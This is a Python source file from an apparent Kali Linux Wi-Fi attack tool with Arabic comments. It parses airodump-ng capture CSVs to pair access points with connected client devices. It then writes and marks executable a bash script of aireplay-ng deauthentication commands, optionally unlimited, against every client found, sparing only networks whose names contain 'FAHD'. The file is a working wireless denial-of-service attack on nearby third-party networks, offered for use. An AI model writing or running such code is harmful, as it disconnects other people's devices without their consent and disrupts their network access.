#!/usr/bin/env python3
import csv
import os

class StrikeCsvParser:
    @staticmethod
    def parse_live_data(csv_path):
        """[تطهير الـ CSV الحركي]: فك الأسطر حياً وقنص الماكات مباشرة من ملف الأثير لطلبك"""
        if not os.path.exists(csv_path) or os.path.getsize(csv_path) == 0: return [], {}
        
        ap_map = {}
        stations = []
        try:
            with open(csv_path, "r", encoding="utf-8", errors="ignore") as f: content = f.read()
            sections = content.split("\n\n")
            if len(sections) < 2 or "Station MAC" not in content: return [], {}
            
            for row in csv.reader(sections[0].strip().split("\n")):
                if row and len(row) >= 14 and not row[0].startswith("BSSID"):
                    bssid = row[0].strip().upper()
                    essid = row[13].strip()
                    ap_map[bssid] = essid if essid else "[Hidden Network]"
                    
            for row in csv.reader(sections[1].strip().split("\n")):
                if not row or len(row) < 6 or row[0].startswith("Station MAC"): continue
                client = row[0].strip().upper()
                bssid = row[5].strip().upper()
                power = row[3].strip()
                
                if bssid and bssid != "(NOT ASSOCIATED)" and bssid in ap_map:
                    stations.append({"client": client, "bssid": bssid, "ssid": ap_map[bssid], "power": power})
        except Exception: pass
        return stations, ap_map

    @staticmethod
    def compile_payload_sh(stations, pkts_count, target_socket):
        """الحظر التلقائي والمطلق لشبكاتك التابعة وصياغة ملف المقاذيف التتابعية .sh"""
        clean_pool, protected_logs = [], []
        with open("/home/kali/AeroCage-X/storage/active_strikes.sh", "w") as f:
            f.write("#!/bin/bash\n# الذخيرة الحية التتابعية الجاهزة للقذف فوراً لطلبك\n\n")
            for tgt in stations:
                if "FAHD" in tgt["ssid"].upper():
                    protected_logs.append({"mac": tgt["client"], "ssid": tgt["ssid"], "reason": "حماية حياض شبكتك التابعة 🛡️"})
                    continue
                cmd = f"aireplay-ng {'-0 ' + str(pkts_count) if pkts_count > 0 else '-0 0'} -a {tgt['bssid']} -c {tgt['client']} {target_socket}"
                f.write(f"{cmd}\nsleep 1\n")
                clean_pool.append({"client": tgt["client"], "bssid": tgt["bssid"], "ssid": tgt["ssid"], "power": tgt["power"], "cmd": cmd})
        os.chmod("/home/kali/AeroCage-X/storage/active_strikes.sh", 0o755)
        return clean_pool, protected_logs
